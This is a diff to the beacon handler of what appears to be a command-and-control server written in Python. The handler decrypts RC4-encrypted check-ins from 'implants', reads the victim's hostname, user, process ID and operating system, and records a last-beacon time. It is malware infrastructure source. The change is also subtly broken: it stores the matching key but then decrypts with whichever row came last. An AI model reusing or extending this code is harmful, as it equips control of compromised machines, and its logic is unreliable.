@@ -121,25 +121,25 @@ class WebServer(object):
                 # tries to decrypt using each key
                 for row in results:
                     # if successful decryption
+                    # saves encryption key as a variable
                     if "hostname" in self.crypt(row[0], raw_data):
-                        # JSON decodes POST data
-                        j = json.loads(self.crypt(row[0], raw_data))
+                        key = row[0]
 
-                        hostname = j["hostname"]
-                        current_user = j["current_user"]
-                        process_id = j["process_id"]
-                        operating_system = j["operating_system"]
+            # JSON decodes POST data
+            j = json.loads(self.crypt(row[0], raw_data))
+            hostname = j["hostname"]
+            current_user = j["current_user"]
+            process_id = j["process_id"]
+            operating_system = j["operating_system"]
 
-                        # updates "last_beacon" time in "implants" table
-                        # uses previously opened cursor
-                        cursor.execute("""UPDATE implants SET last_beacon = ?
-                                          WHERE hostname = ?
-                                          AND process_id = ?""",
-                                       (current_time,
-                                        hostname,
-                                        process_id))
-
-                        # TO DO: checks for tasking
+            # updates "last_beacon" time in "implants" table
+            # uses previously opened cursor
+            cursor.execute("""UPDATE implants SET last_beacon = ?
+                              WHERE hostname = ?
+                              AND process_id = ?""",
+                           (current_time,
+                            hostname,
+                            process_id))
 
             return "RC4 beacon"
 
